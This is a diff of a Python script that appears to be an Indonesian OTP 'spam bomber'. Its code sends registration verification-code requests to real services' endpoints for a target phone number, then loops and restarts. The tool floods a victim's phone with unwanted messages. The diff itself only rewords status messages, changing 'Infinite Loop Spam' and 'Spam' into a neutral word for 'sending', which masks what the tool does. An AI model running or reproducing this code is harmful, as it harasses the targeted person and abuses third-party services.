@@ -196,7 +196,7 @@ def jam(nomor): # Don't Remove Code !!!!
                 # Ginee                                  =  requests.post("https://accounts.ginee.com/api/iam-service/account/send-verification-code",headers={"Host":"accounts.ginee.com","Connection":"keep-alive","Content-Length":"114","Accept":"application/json, text/plain, */*","Content-Type":"application/json;charset=UTF-8","Accept-Language":"en","sec-ch-ua-mobile":"?1","User-Agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","sec-ch-ua-platform":"Android","Origin":"https://accounts.ginee.com","Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty","Referer":"https://accounts.ginee.com/accounts/registered?system_id=SAAS&from=OFFICIAL_SITE&country=ID&utm_source=Article&utm_campaign=Ginee_ID","Accept-Encoding":"gzip, deflate, br"},data=json.dumps({"account":"0"+nomor,"countryCode":"ID","verificationPurpose":"USER_REGISTRATION","verificationType":"PHONE"})).text
                 Misteraladin                           =  requests.post("https://m.misteraladin.com/api/members/v2/otp/request",headers={"Host":"m.misteraladin.com","accept-language":"id","sec-ch-ua-mobile":"?1","content-type":"application/json","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","x-platform":"mobile-web","sec-ch-ua-platform":"Android","origin":"https://m.misteraladin.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.misteraladin.com/account","accept-encoding":"gzip, deflate, br"},data=json.dumps({"phone_number_country_code":"62","phone_number":nomor,"type":"register"})).text
                 
-                autoketik(f"{hijau}Sukses Mengirim WAIFU")
+                autoketik(f"{hijau}Sukses Mengirim WAIFU >_<")
                 countdown(120) # Jangan Diubah !!!!
                 
             except requests.exceptions.ConnectionError: # Error Handling Ketika Request Time Out di salah satu URL API
@@ -313,14 +313,14 @@ def jam(nomor): # Don't Remove Code !!!!
 def start(nomor,x): # Def Untuk Start Tools
     if x == 0: # Flag ketika pertama kali masuk kedalam Fungsi start()
         os.system("cls") # Clear Terminal
-        autoketik(f"{merah}Infinite Loop Spam to {putih}{nomor} {merah}is {hijau}Ready!{hijau}") # Flag dimana program berjalan
+        autoketik(f"{merah}Pengiriman Sedang Berjalan ke Nomor {putih}{nomor} {merah}Sudah {hijau}Siap!{hijau}") # Flag dimana program berjalan
         jam(nomor)
     else:
         print("")
         autoketik("--reboot wait 20 second--")
         time.sleep(15) # Tunda 20 detik
         os.system("cls") # Clear Terminal
-        autoketik(f"{merah}Mengulang Spam ke Nomor : {nomor}.....{hijau}") # Flag dimana program berjalan
+        autoketik(f"{merah}Mengulang Pengiriman ke Nomor : {nomor}.....{hijau}") # Flag dimana program berjalan
         jam(nomor)
         
 def main():
